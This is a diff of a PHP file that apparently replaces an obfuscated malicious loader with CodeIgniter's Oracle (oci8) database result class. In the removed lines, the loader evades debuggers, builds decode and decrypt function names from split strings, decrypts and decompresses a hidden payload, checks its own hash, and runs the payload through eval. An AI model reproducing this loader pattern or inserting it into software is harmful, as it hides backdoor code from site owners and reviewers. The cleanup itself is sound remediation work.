@@ -1,28 +1,201 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_tf7unfuz=('bas'.'e64'.'_de'.'cod'.'e');
-$_stwcd0z0=('gzu'.'nco'.'mpr'.'ess');
-$_dp0tlm1e=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_viqeeohq='LcE7Z8eD';
-$_pobxygg0='iOxjlNan';
-$_fb9ghfy5='m4sh/x9m';
-$_esnehocx='LQ4wTlAB6rk=';
-$_zqxijhvq='WqFgCIMZ';
-$_fcohm3qe='BGkUGw==';
-$_xkfldj3b='lA7t5wSy';
-$_lajejndb='rAwvOYsC';
-$_y1mxjz09=$_tf7unfuz($_fb9ghfy5.$_zqxijhvq.$_pobxygg0.$_viqeeohq.$_esnehocx);
-$_ktrguk83=$_tf7unfuz($_xkfldj3b.$_lajejndb.$_fcohm3qe);
-$_sdojzb6w=$_tf7unfuz('r1qv1rJoLUN9rgK31nbSOdnx2b2xiZdhRE0dtmE2askNTejNlgTgSdo5qoL4Gva4z9BAC+5nSobwqqofl+tQoGbpBl7+pXahw069DwwY2+p/OLCGGfWFRCSddwlYqlInIUq5JtaR+S9pihBLbwa4N4/XwMmdEey+YFwsUTuW0yRzrd1AK9Hm50P/nWd4U5MmhiM8b2mVtx3Ly+bZmhVZT28f6hGtEgX5v+U6rsJLDjKLTgu8mVyyTSzHMnRsa+xanrekgSLzOiTCelUi7+G/oPy3LoxxxU4Ar4e9MZoX5R8NTAAqKmA2ST3Z5KGZgZ0D0uZkF4hlzRnyJ179vhuR/ByZvsqdeyKaxUu/QZZFwNOrBghSydKNOarYNNawwP57ZufPiDSRYFnwFqBGLtC9uU3q/woAc5ZlrELgVDP52nTzyGJFD+WX8hm0fOh2qtan9jFCneF7ceZXtljqDuLGpvkt+lTFdR1SRcOY37WoUY6x3L4Utyr6GMCm7+STaKgWsQYv9hUHVoNNMUGBVS3L1QxfFp8XWRhlq16Ch0XplNUbcJwiVJ3rVP2T4ZnqvN6vYGsp83DoklQgzZZQGc1QMc4XqZpi1aasD7G95WL5Ol66ucHwivIPQnDE8U9y8DfnZ2Ah5gJL6ymKbxqWxiCO+07ibEn9sb9f+5rYcKxbQWk4I1pwMj/9rdLa4LDtzaLR3Bf6UtC/Bpi+aoLQzSCQV1hIs6BZEyPS5C2oNQN7K7poPXvIYiKJS2QggxqE/bVPhRLuVztPuDo29rIziCyFkgjQ22lH4SPGYZD+rRa10mAxG/tIPNrBS2DrUoG4laHuy1mxNVvJ+phl9q+k4xfInfIXb7HthFpYbCrd5pFJ7Bk=');
-$_nhp8v9nc=$_dp0tlm1e($_sdojzb6w,'aes-256-cbc',$_y1mxjz09,OPENSSL_RAW_DATA,$_ktrguk83);
-if($_nhp8v9nc===false){exit;}
-$_d0jpfyp3=$_stwcd0z0($_nhp8v9nc);
-if($_d0jpfyp3===false){exit;}
-$_qozvq69h='6363362ef74ed8cdf41f123f030c7e0691f5cd8fccea6d27e899402aa0c758c8';
-$_js7b88wp=@file_get_contents(__FILE__);
-if($_js7b88wp!==false){
-$_suqehl8l=str_replace($_qozvq69h,"0000000000000000000000000000000000000000000000000000000000000000",$_js7b88wp);
-$_d5o27xqc=hash("sha256",$_suqehl8l);
-if($_d5o27xqc!==$_qozvq69h){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+class CI_DB_oci8_result extends CI_DB_result {
+
+
+
+
+
+public $stmt_id;
+
+
+
+
+
+public $curs_id;
+
+
+
+
+
+public $limit_used;
+
+
+
+
+
+public $commit_mode;
+
+
+
+
+
+
+
+public function __construct(&$driver_object)
+{
+parent::__construct($driver_object);
+$this->stmt_id = $driver_object->stmt_id;
+$this->curs_id = $driver_object->curs_id;
+$this->limit_used = $driver_object->limit_used;
+$this->commit_mode =& $driver_object->commit_mode;
+$driver_object->stmt_id = FALSE;
 }
-eval($_d0jpfyp3);
+
+
+
+
+
+
+public function num_fields()
+{
+$count = oci_num_fields($this->stmt_id);
+
+return ($this->limit_used) ? $count - 1 : $count;
+}
+
+
+
+
+
+
+
+
+public function list_fields()
+{
+$field_names = array();
+for ($c = 1, $fieldCount = $this->num_fields(); $c <= $fieldCount; $c++)
+{
+$field_names[] = oci_field_name($this->stmt_id, $c);
+}
+return $field_names;
+}
+
+
+
+
+
+
+
+
+public function field_data()
+{
+$retval = array();
+for ($c = 1, $fieldCount = $this->num_fields(); $c <= $fieldCount; $c++)
+{
+$F = new stdClass();
+$F->name = oci_field_name($this->stmt_id, $c);
+$F->type = oci_field_type($this->stmt_id, $c);
+$F->max_length = oci_field_size($this->stmt_id, $c);
+$retval[] = $F;
+}
+return $retval;
+}
+
+
+
+
+
+
+public function free_result()
+{
+if (is_resource($this->result_id))
+{
+oci_free_statement($this->result_id);
+$this->result_id = FALSE;
+}
+if (is_resource($this->stmt_id))
+{
+oci_free_statement($this->stmt_id);
+}
+if (is_resource($this->curs_id))
+{
+oci_cancel($this->curs_id);
+$this->curs_id = NULL;
+}
+}
+
+
+
+
+
+
+
+
+protected function _fetch_assoc()
+{
+$id = ($this->curs_id) ? $this->curs_id : $this->stmt_id;
+return oci_fetch_assoc($id);
+}
+
+
+
+
+
+
+
+
+
+protected function _fetch_object($class_name = 'stdClass')
+{
+$row = ($this->curs_id)
+? oci_fetch_object($this->curs_id)
+: oci_fetch_object($this->stmt_id);
+if ($class_name === 'stdClass' OR ! $row)
+{
+return $row;
+}
+$class_name = new $class_name();
+foreach ($row as $key => $value)
+{
+$class_name->$key = $value;
+}
+return $class_name;
+}
+}
